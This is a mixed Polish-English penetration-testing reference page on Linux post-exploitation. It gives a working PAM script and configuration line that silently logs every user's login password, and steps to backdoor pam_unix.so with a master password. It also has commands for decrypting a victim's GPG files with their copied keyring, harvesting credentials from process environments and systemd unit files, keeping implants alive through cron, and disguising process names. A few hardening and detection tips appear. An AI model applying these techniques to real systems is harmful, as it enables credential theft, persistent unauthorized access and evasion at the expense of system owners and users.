# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

Skonfigurujmy moduł PAM, aby logował każde hasło używane przez użytkowników podczas logowania. Jeśli nie wiesz, czym jest PAM, sprawdź:


{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. To tylko podsumowanie:

**Technique Overview:**
Pluggable Authentication Modules (PAM) oferują elastyczność w zarządzaniu uwierzytelnianiem w systemach opartych na Unix. Mogą zwiększać bezpieczeństwo poprzez dostosowanie procesu logowania, ale także stwarzają ryzyko, jeśli są nadużywane. To podsumowanie przedstawia technikę przechwytywania poświadczeń logowania przy użyciu PAM oraz strategie łagodzenia skutków.

**Capturing Credentials:**

- Skrypt bash o nazwie `toomanysecrets.sh` został stworzony, aby logować próby logowania, zapisując datę, nazwę użytkownika (`$PAM_USER`), hasło (przez stdin) oraz IP zdalnego hosta (`$PAM_RHOST`) do `/var/log/toomanysecrets.log`.
- Skrypt jest oznaczony jako wykonywalny i zintegrowany z konfiguracją PAM (`common-auth`) przy użyciu modułu `pam_exec.so` z opcjami uruchamiania w trybie cichym oraz udostępnienia tokena uwierzytelnienia skryptowi.
- Podejście demonstruje, jak skompromitowany host Linux może zostać wykorzystany do dyskretnego zapisywania poświadczeń.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**For further details check the [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. This is just a summary:

Pluggable Authentication Module (PAM) to system używany w Linux do uwierzytelniania użytkowników. Działa w oparciu o trzy główne koncepcje: **username**, **password** i **service**. Pliki konfiguracyjne dla każdej usługi znajdują się w katalogu `/etc/pam.d/`, gdzie shared libraries obsługują uwierzytelnianie.

**Cel**: Zmodyfikować PAM tak, aby pozwalał na uwierzytelnienie przy użyciu określonego hasła, omijając rzeczywiste hasło użytkownika. Dotyczy to w szczególności biblioteki współdzielonej `pam_unix.so` używanej przez plik `common-auth`, który jest dołączany przez niemal wszystkie usługi do weryfikacji hasła.

### Steps for Modifying `pam_unix.so`:

1. **Locate the Authentication Directive** in the `common-auth` file:
- The line responsible for checking a user's password calls `pam_unix.so`.
2. **Modify Source Code**:
- Add a conditional statement in the `pam_unix_auth.c` source file that grants access if a predefined password is used, otherwise, it proceeds with the usual authentication process.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- Access is granted across various services (login, ssh, sudo, su, screensaver) with the predefined password, while normal authentication processes remain unaffected.

> [!TIP]
> Możesz zautomatyzować ten proces za pomocą [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Decrypting GPG loot via homedir relocation

Jeśli znajdziesz zaszyfrowany plik `.gpg` oraz katalog użytkownika `~/.gnupg` (pubring, private-keys, trustdb) ale nie możesz odszyfrować z powodu uprawnień/locków homedir GnuPG, skopiuj keyring do zapisywalnej lokalizacji i użyj go jako swojego GPG home.

Typowe błędy, które zobaczysz bez tego: "unsafe ownership on homedir", "failed to create temporary file", lub "decryption failed: No secret key" (ponieważ GPG nie może czytać/zapisywać oryginalnego homedir).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
Jeśli materiał klucza prywatnego znajduje się w `private-keys-v1.d`, GPG odblokuje i odszyfruje bez proszenia o passphrase (albo poprosi, jeśli klucz jest chroniony).


## Pozyskiwanie poświadczeń ze zmiennych środowiskowych procesu (w tym kontenery)

Po uzyskaniu wykonania kodu wewnątrz usługi, proces często dziedziczy wrażliwe zmienne środowiskowe. Są one kopalnią dla lateral movement.

Quick wins
- Zrzut zmiennych środowiskowych bieżącego procesu: `env` or `printenv`
- Zrzut zmiennych innego procesu: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- Dodaj `strings -z /proc/<PID>/environ` jeśli `tr`/`sed` nie są dostępne
- W kontenerach sprawdź też PID 1: `tr '\0' '\n' </proc/1/environ`

Na co zwracać uwagę
- Sekrety aplikacji i dane admina (np. Grafana ustawia `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`)
- Klucze API, URI bazy danych, poświadczenia SMTP, sekrety OAuth
- Proxy i nadpisania TLS: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

Uwagi
- Wiele orkiestracji przekazuje wrażliwe ustawienia przez zmienne środowiskowe; są one dziedziczone przez procesy potomne i ujawnione każdej powłoce, którą uruchomisz w kontekście procesu.
- W niektórych przypadkach poświadczenia te są używane globalnie w systemie (np. ta sama nazwa użytkownika/hasło działające dla SSH na hoście), umożliwiając łatwy pivot.

## Poświadczenia przechowywane przez systemd w plikach unit (Environment=)

Usługi uruchamiane przez systemd mogą umieszczać poświadczenia w plikach unit jako wpisy `Environment=`. Wypisz i wyodrębnij je:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
Artefakty operacyjne często powodują leak haseł (np. skrypty backupowe, które wywołują `zip -P <pwd>`). Te wartości są często ponownie używane w wewnętrznych interfejsach webowych (Basic-Auth) lub innych usługach.

Wzmocnienie
- Przenieś sekrety do dedykowanych magazynów sekretów (`systemd-ask-password`, `EnvironmentFile` z zablokowanymi uprawnieniami, lub zewnętrznych menedżerów sekretów)
- Unikaj osadzania poświadczeń w plikach unit; preferuj pliki drop-in czytelne tylko dla root i usuń je z kontroli wersji
- Rotuj hasła ujawnione podczas testów

## Cron-based persistence with loopback mutex

- Skopiuj implanty do wielu zapisywalnych ścieżek (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) i zainstaluj wpisy cron, takie jak `*/5 * * * * /tmp/<bin>`, aby odradzały się nawet jeśli zostaną usunięte gdzie indziej.
- Wymuszaj **single-instance** wykonanie przez bindowanie stałego portu loopback (np. `127.0.0.1:51125` lub `127.0.0.1:52225`) i zakończ program jeśli `bind()` się nie powiedzie; `ss -lntp | grep -E '51125|52225'` ujawni nasłuchujący mutex.
- Operatorzy mogą okresowo masowo zabijać każdy proces, którego `cmdline` zawiera nazwę droppera (np. `init_stop`), więc ponowne użycie takich nazw podczas analizy może powodować kolizje; wybieraj unikalne nazwy plików.

## Process masquerading via prctl + argv overwrite

- Ustaw krótką nazwę procesu za pomocą `prctl(PR_SET_NAME, "<label>")` (15-bajtowy limit `comm`), zwykle na `init`, tak aby `/proc/<pid>/status` i GUI pokazywały benign label.
- Nadpisz w pamięci bufor `argv[0]` po odczytaniu długości `/proc/self/cmdline` i wskaźnika `argv[0]`, dopasowując zawartość NUL-ami, aby `/proc/<pid>/cmdline` i `ps` również pokazywały fałszywą etykietę.
- Szukaj porównując `Name:` w `/proc/<pid>/status` z rzeczywistą ścieżką wykonywalną oraz wyszukując nasłuchujące mutexy loopback należące do procesów z krótkimi/pustymi cmdline.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
